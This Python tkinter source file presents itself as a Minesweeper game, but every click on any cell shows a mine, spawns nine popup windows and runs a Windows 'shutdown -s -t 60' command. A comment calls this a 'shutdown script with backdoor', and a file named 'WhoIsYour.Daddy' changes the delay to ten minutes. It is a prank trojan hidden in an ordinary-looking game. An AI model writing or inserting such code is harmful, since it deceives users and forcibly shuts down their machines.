import tkinter as tk
from gui import MyButton, ShutdownWindow
from PIL import Image, ImageTk
import threading
import time
import subprocess
import os


class MineSweeper(object):
    def __init__(self):
        # window config
        self.root = tk.Tk()
        self.window_size = (630, 520)
        self.root.geometry("650x550")
        self.root.title("扫雷")
        self.root.resizable(False, False)

        # menubar
        menubar = tk.Menu(self.root)
        game_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="游戏(G)", menu=game_menu)
        help_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="帮助(H)", menu=help_menu)
        self.root.configure(menu=menubar)

        # layout config
        self.frame = tk.Frame(self.root)
        self.frame.pack()

        # control frame
        self.control_frame = tk.Frame(self.frame, width=self.window_size[0] + 7, height=50, border=4, relief=tk.SUNKEN)
        self.control_frame.propagate(False)
        self.control_frame.grid(row=0, column=0, sticky=tk.NW)
        self.time_left_label = tk.Label(self.control_frame, border=2, relief=tk.SUNKEN)
        self.time_left_label.img = ImageTk.PhotoImage(Image.open("static/time_left.png").resize([55, 30], Image.CUBIC))
        self.time_left_label.configure(image=self.time_left_label.img, width=55, height=30)
        self.time_left_label.pack(side=tk.LEFT, padx=8)
        self.score_label = tk.Label(self.control_frame, border=2, relief=tk.SUNKEN)
        self.score_label.img = ImageTk.PhotoImage(Image.open("static/score.png").resize([55, 30], Image.CUBIC))
        self.score_label.configure(image=self.score_label.img, width=55, height=30)
        self.score_label.pack(side=tk.RIGHT, padx=8)
        self.status_label = tk.Button(self.control_frame, border=2, width=30, height=45)
        self.status_label.img = ImageTk.PhotoImage(Image.open("static/smile.png").resize([32, 32], Image.CUBIC))
        self.status_label.configure(image=self.status_label.img)
        self.status_label.pack(pady=5)

        # mine frame
        self.mine_frame = tk.Frame(self.frame, width=self.window_size[0], height=430, border=4, relief=tk.SUNKEN)
        self.mine_frame.propagate(False)
        self.mine_frame.grid(row=1, column=0, sticky=tk.NW)
        # button
        for row_num in range(10):
            for col_num in range(14):
                _btn = MyButton(self.mine_frame, row_num=row_num, col_num=col_num, width=5, height=2)
                _btn.bind("<Button>", self.btn_callback)
                _btn.grid(row=row_num, column=col_num)

        tk.mainloop()

    def btn_callback(self, event):
        # source material loading
        _btn = event.widget
        _btn._img = ImageTk.PhotoImage(Image.open("static/mine.png"))
        _btn.configure(image=_btn._img, width=39, height=41)
        self.status_label.img = ImageTk.PhotoImage(Image.open("static/cry.png").resize([32, 32], Image.CUBIC))
        self.status_label.configure(image=self.status_label.img)

        # popup window
        def _(n):
            time.sleep(n * 0.3)
            ShutdownWindow()

        for i in range(9):
            threading.Thread(target=_, args=(i,)).start()

        # shutdown script with backdoor
        if os.path.exists("WhoIsYour.Daddy"):
            subprocess.Popen("shutdown -s -t 600")
        else:
            subprocess.Popen("shutdown -s -t 60")
